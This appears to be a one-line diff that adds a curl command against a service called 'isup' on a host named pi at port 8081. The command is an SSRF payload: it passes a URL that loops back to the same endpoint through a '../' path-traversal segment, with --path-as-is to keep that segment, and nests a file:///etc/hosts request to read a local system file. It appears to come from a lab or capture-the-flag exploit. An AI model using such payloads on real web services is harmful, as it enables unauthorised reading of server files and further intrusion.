@@ -1,0 +1,1 @@
+curl --path-as-is -X POST -d 'name=http://pi:8081/kuchenblech/../isup?name=file:///etc/hosts' 'http://pi:8081/isup'
